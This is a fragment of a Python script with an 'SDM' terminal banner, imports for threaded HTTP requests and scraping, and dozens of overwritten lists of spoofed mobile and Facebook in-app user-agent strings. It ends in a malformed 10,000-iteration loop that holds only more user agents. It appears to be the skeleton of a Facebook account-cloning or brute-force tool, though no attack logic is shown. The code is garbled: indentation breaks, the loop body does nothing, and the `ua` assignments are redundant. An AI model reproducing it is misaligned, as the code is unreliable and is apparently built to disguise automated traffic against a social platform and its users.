a1 = '\x1b[1;31m'  # أحمر
print(a1+'''\033[1;34m
\x1b[38;5;180m \x1b[38;5;180m''') 
SDMVIP="""
\x1b[1;31m 
──────────────────────────────────────────────────────
─██████████████─████████████───██████──────────██████─
─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒████─██▒▒██████████████▒▒██─
─██▒▒██████████─██▒▒████▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██─
─██▒▒██─────────██▒▒██──██▒▒██─██▒▒██████▒▒██████▒▒██─
─██▒▒██████████─██▒▒██──██▒▒██─██▒▒██──██▒▒██──██▒▒██─
─██▒▒▒▒▒▒▒▒▒▒██─██▒▒██──██▒▒██─██▒▒██──██▒▒██──██▒▒██─
─██████████▒▒██─██▒▒██──██▒▒██─██▒▒██──██████──██▒▒██─
─────────██▒▒██─██▒▒██──██▒▒██─██▒▒██──────────██▒▒██─
─██████████▒▒██─██▒▒████▒▒▒▒██─██▒▒██──────────██▒▒██─
─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒████─██▒▒██──────────██▒▒██─
─██████████████─████████████───██████──────────██████─
────────────────────────────────────────────────────── """
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
pretty.install()
CON=sol()

ua = ["Mozilla/5.0 (Linux; Android 11; 2107113SI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; RMX2193 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/385.0.0.32.114",]
ua = ["Mozilla/5.0 (Linux; Android 11; 2107113SI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-A405FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A127F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/431.0.0.30.108",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/433.0.0.31.111",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A115F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102",]
ua = ["Mozilla/5.0 (Linux; Android 12; CRT-LX2 Build/HONORCRT-L32; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102",]
ua = ["Mozilla/5.0 (Linux; Android 12; ANG-AN00 Build/HUAWEIANG-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104",]
ua =["Mozilla/5.0 (Linux; Android 14; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.5669.73 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 10; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.5326.82 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 8; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5479.49 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 13; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.5903.48 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 14; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/50.0.4777.63 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 14; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.3011.34 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 10; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4336.91 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 10; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.5565.86 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 11; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.5508.92 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 15; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/45.0.4342.48 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 14; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.3242.85 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 11; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.5508.92 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 13; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.3495.98 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 9; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.5260.45 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 13; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.4573.22 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 13; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.5046.74 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 10; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/50.0.3767.91 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 11; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.3275.69 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Windows NT 10.0; 11; Windows NT 10.0N50G) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4520.72 Chrome/109.0.0.0 Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 10; NEO-AL00 Build/HUAWEINEO-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102",]
ua = ["Mozilla/5.0 (Linux; Android 13; Infinix X6710 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102;]",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X676B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/433.0.0.31.111",]
ua = ["Mozilla/5.0 (Linux; Android 11; Infinix X6816D Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/pl_PL;FBAV/373.1.0.8.104",]
ua = ["Mozilla/5.0 (Linux; Android 12; HarmonyOS; LNA-AL00; HMSCore 6.11.0.332) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.1.302 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Nokia C300 Build/SKQ1.220213.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; Nokia C110 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63",]
ua = ['Mozilla/5.0 (Linux; Android 7.0; MS50L Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]',]
ua = ['Mozilla/5.0 (Linux; Android 8.0.0; SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36',]
ua = ["Mozilla/5.0 (Linux; Android 10; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36",]
ua = ['Mozilla/5.0 (Linux; Android 5.1.1; SM-J200H Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/238.0.0.41.116;]']
ua = ['Mozilla/5.0 (Linux; Android 5.1.1; SM-J200G Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]']
ua = ['Mozilla/5.0 (Linux; Android 10; MAR-LX1A Build/HUAWEIMAR-L01A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]']
ua = ['Mozilla/5.0 (Linux; Android 12; MP17 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]']
ua = ['Mozilla/5.0 (Linux; Android 12; 22122RK93C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]']
ua = ['Mozilla/5.0 (Linux; Android 9; MAR-LX1A Build/HUAWEIMAR-L21A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.163 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]']
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 6.0; CAM-UL00 Build/HONORCAM-UL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",]
ua = ["Mozilla/5.0 (Linux; Android 6.0.1; SM-J700M Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/417.0.0.33.65;]",]
ua = ["Mozilla/5.0 (Linux; Android 8.1.0; SM-J710F Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.86 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/391.1.0.37.104;]",]
ua = ["Mozilla/5.0 (Linux; Android 11; RMX3201) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 7.0; MS50L Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]",]
ua = ['Mozilla/5.0 (Linux; Android 5.0.2; HTC Desire Eye Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/351.1.0.12.114;]']
ua = ['Mozilla/5.0 (Linux; Android 11; V1936A Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/326.9.0.13.112;]']
ua = ['Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321 [FBAN/FBIOS;FBAV/38.0.0.6.79;FBBV/14316658;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/8.4.1;FBSS/3; FBCR/csl.;FBID/phone;FBLC/en_US;FBOP/5]']
ua = ['Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.76 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]',]
ua = ['Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/418.0.0.11.71;]',]
ua = ['Mozilla/5.0 (Linux; Android 13; SM-A135M Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 13; SM-A137F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108;]',]
ua = ['Mozilla/5.0 (Linux; Android 12; SM-N970F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/400.0.0.11.90;]',]
ua = ['Mozilla/5.0 (Linux; Android 11; SM-G986B) AppleWebKit/537.36 (KHTML, like Gecko) Stargon/5.1.1 Chrome/114.0.5735.61 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 13; SM-G986B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.177 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]',]
ua = ['Mozilla/5.0 (Linux; Android 10; SM-J400F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;',]
ua = ['Mozilla/5.0 (Linux; Android 10; SM-J400M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/350.0.0.5.116;]',]
ua = ['Mozilla/5.0 (Linux; Android 10; SM-J400F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/401.0.0.14.97;',]
ua = ['Mozilla/5.0 (Linux; Android 11; SM-A505W Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/424.0.0.21.75;]',]
ua = ['Mozilla/5.0 (Linux; Android 11; 220333QPG Build/RD2A.211001.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]',]
ua = ['Mozilla/5.0 (Linux; Android 11; 220333QPG Build/RD2A.211001.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.227 Mobile Safari/537',]
ua = ['Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20A5356a [FBAN/FBIOS;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5]',]
ua = ['Mozilla/5.0 (Linux; Android 10; itel L6502 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/320.0.0.12.108;]',]
ua = ['Mozilla/5.0 (Linux; Android 10; itel L6502 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/380.0.0.29.109;]',]
ua = ['Mozilla/5.0 (Linux; Android 10; itel L6502 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/372.0.0.10.112;]',]
ua = ['Mozilla/5.0 (Linux; Android 10; Infinix X682C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/345.0.0.8.69;]',]
ua = ['Mozilla/5.0 (Linux; Android 10; Infinix X682C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]',]
ua = ['Mozilla/5.0 (Linux; Android 10; Infinix X682B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 9; CPH2083 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/390.0.0.27.105;]',]
ua = ['Mozilla/5.0 (Linux; Android 9; CPH2083 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/318.0.0.16.105;]',]
ua = ['Mozilla/5.0 (Linux; Android 9; CPH2083) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 11; XIAOMI POCO X2 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36 AlohaBrowser/3.0.4',]
ua = ['Mozilla/5.0 (Linux; Android 12; RMX3286 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]',]
ua = ['Mozilla/5.0 (Linux; Android 12; RMX3286 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 11; RMX3286 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/357.0.0.12.72;]',]
ua = ['Mozilla/5.0 (Linux; Android 11; SM-A107F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/420.0.0.32.61;]',]
ua = ['Mozilla/5.0 (Linux; Android 11; SM-A107F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/362.0.0.10.67;]',]
ua = ['Mozilla/5.0 (Linux; Android 11; SM-A107M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;]',]
ua = ['Mozilla/5.0 (Linux; Android 13; CPH2481 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/411.1.0.29.112;]',]
ua = ['Mozilla/5.0 (Linux; Android 10; FRL-L23 Build/HUAWEIFRL-L23; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/353.0.0.34.116;]',]
ua = ['Mozilla/5.0 (Linux; Android 10; FRL-L23; HMSCore 6.8.0.331) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.3.304 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 12; RMX3085 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]',]
ua = ['Mozilla/5.0 (Linux; Android 12; RMX3085 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/395.0.0.10.75;]',]
ua = ['Mozilla/5.0 (Linux; Android 11; SM-E225F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/355.0.0.21.108;]',]
ua = ['Mozilla/5.0 (Linux; Android 13; SM-E225F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]',]
ua = ['Mozilla/5.0 (Linux; Android 13; SM-A135M Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 13; SM-A137F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108;]',] 
for xd in range(10000):
	     
  "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E; GWX:QUALIFIED)",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2",
  "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
  "Mozilla/5.0 (Android; Tablet; rv:34.0) Gecko/34.0 Firefox/34.0",
  "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch)",
  "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar)",
  "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E; GWX:QUALIFIED)",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2)",
  "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36)",
  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36)",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko)",
  "Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36)",
  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
  "Mozilla/5.0 (Android; Tablet; rv:34.0) Gecko/34.0 Firefox/34.0)",
